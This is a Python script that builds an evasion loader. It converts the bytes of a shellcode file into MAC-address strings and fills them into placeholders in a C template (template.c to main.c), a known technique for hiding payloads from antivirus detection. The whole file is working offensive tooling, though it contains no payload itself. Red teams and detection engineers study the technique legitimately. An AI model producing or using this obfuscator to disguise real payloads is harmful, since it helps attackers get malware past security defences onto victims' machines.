import os
import sys
import random

def file_to_bytearray(filename):
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return bytearray(file_content)
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise

def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def fill_template(obfuscated_data, original_data_size, num_macs):
    try:
        # Read the content of the input file
        with open("template.c", 'r') as file:
            content = file.read()

        # Replace the strings
        modified_content = content.replace("{{SHELLCODE}}", obfuscated_data).replace("{{SHELLCODE_SIZE}}", original_data_size).replace("{{NUM_MACS}}", str(num_macs))

        # Write the modified content to the output file
        with open("main.c", 'w') as file:
            file.write(modified_content)

        print("[i] Template filled successfully.")
    
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))

def shellcode_to_macs(data):
    mac_addresses = []

    # Check if the data is divisible by 6
    if len(data) % 6 != 0:
        # Add random bytes to make the data divisible by 6
        data += bytearray(random.choices(range(256), k=6 - len(data) % 6))

    # Split the data into chunks of 6 bytes
    for i in range(0, len(data), 6):
        chunk = data[i:i+6]
        
        # Create the MAC address
        ip = f"{chunk[0]:02x}-{chunk[1]:02x}-{chunk[2]:02x}-{chunk[3]:02x}-{chunk[4]:02x}-{chunk[5]:02x}"
        mac_addresses.append(ip)

    return mac_addresses

def create_macs_string(macs):
    macs_str = ""
    # Create the string with the MAC addresses
    for i, mac in enumerate(macs):
        macs_str += f"\"{mac}\", "
        if (i+1) % 3 == 0:
            # If its the last MAC address, don't add a new line
            if i != len(macs) - 1:
                macs_str += "\n\t"
            
    # Remove the last comma
    macs_str = macs_str[:-2]

    return macs_str

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[i] Usage: python script.py <file_path>")
        sys.exit(1)
    
    filename = sys.argv[1]
    if os.path.isfile(filename):
        original_data = file_to_bytearray(filename)

        # Number of bytes in the original data
        original_data_size = len(original_data)

        # Convert the original data to MAC addresses
        obfuscated_data = shellcode_to_macs(original_data)

        # Create the string with the MAC addresses
        macs_str = create_macs_string(obfuscated_data)

        # Fill template
        fill_template(macs_str, str(original_data_size), len(obfuscated_data))

    else:
        print("[!] File not found or invalid path:", filename)
